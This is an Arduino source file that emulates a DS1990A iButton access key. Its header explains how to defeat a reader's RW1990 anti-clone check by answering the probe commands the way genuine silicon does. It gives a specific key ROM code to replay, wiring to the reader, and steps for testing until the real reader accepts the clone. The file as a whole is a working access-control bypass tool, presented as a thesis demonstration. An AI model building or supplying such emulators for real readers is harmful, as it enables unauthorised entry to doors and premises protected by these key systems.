/*
 * DS1990A iButton Emulator  (defeats the RW1990 anti-clone probe)
 * ------------------------------------------------------------
 * Board  : Arduino Uno / Nano (16 MHz AVR) recommended.
 *          ATtiny85 @ 16 MHz (Digispark) also works for a compact "fob".
 * Library: OneWireHub  (orgua/OneWireHub)
 *          Install via Library Manager -> search "OneWireHub".
 *
 * WHY THIS WORKS
 *   The target reader does NOT just read the 64-bit ROM. After the read it
 *   probes with RW1990-only commands (0xD1 + 0xB5, and 0x1D + 0x1E) to ask the
 *   chip for its write-flag. A real DS1990A/TM1990A has no such commands: it
 *   stays silent and the line reads 0xFF, so the reader accepts it. An RW1990
 *   answers 0xFE and is detected + rejected.
 *
 *   OneWireHub's DS2401 is a family-0x01 (= DS1990A) slave that implements ONLY
 *   the standard ROM commands (Read/Search/Match/Skip ROM). It ignores
 *   0xD1/0xB5/0x1D/0x1E/0xD5 exactly like genuine silicon, so it passes the
 *   probe.
 *
 * THE CODE BEING EMULATED
 *   ROM = 01 30 48 C8 01 00 00 89   (family 01, serial 30 48 C8 01 00 00,
 *   CRC 0x89 auto-computed by the library). Change the six serial bytes below
 *   to emulate a different key; leave the leading 0x01 as the family code.
 *
 * WIRING
 *   PIN_ONEWIRE -> reader DATA / key centre contact
 *   Arduino GND -> reader GND  / key shell contact   (shared ground required)
 *   The reader supplies the ~1-5k pull-up. Keep the wire short.
 *
 * POWER (important, honest limitation)
 *   A real iButton is parasitically powered from the 1-Wire line. This emulator
 *   is NOT - the microcontroller needs its own supply (USB power bank, or a
 *   battery at the reader's bus voltage, typically ~5V). For a thesis bench
 *   demonstration that is fine; it just isn't a drop-in coin-sized fob.
 *   Before connecting, measure the reader's idle line voltage: if it is much
 *   above ~5.5V do NOT wire a 5V Arduino pin straight to it.
 *
 * HOW TO TEST
 *   1. Upload, power the board, touch PIN_ONEWIRE + GND to your cloner/reader
 *      Arduino: it should read 01 30 48 C8 01 00 00 89, CRC valid.
 *   2. Run the chip-debugger sniffer at the REAL reader while this emulator is
 *      connected: you should see the 0x33 read return the correct code, then
 *      the 0xD1/0xB5/0x1E probes, and the reader should now ACCEPT.
 * ------------------------------------------------------------
 */

#include "OneWireHub.h"
#include "DS2401.h"

constexpr uint8_t PIN_ONEWIRE = 8;   // data line to the reader (+ shared GND)

auto hub = OneWireHub(PIN_ONEWIRE);

// family 0x01, then the 6 serial bytes; CRC (0x89) is computed automatically.
auto key = DS2401(0x01, 0x30, 0x48, 0xC8, 0x01, 0x00, 0x00);

void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);
  hub.attach(key);

  // Flash light in groups (1, 2, 3)
  const uint8_t blinkCounts[] = {1, 2, 3};
  for (uint8_t group = 0; group < 3; group++) {
    for (uint8_t blink = 0; blink < blinkCounts[group]; blink++) {
      digitalWrite(LED_BUILTIN, HIGH);
      delay(50);
      digitalWrite(LED_BUILTIN, LOW);
      delay(50);
    }
    delay(250);   // extra pause between groups (300ms total gap)
  }
}

void loop() {
  hub.poll();   // must run continuously; keep this loop free of blocking delays
}
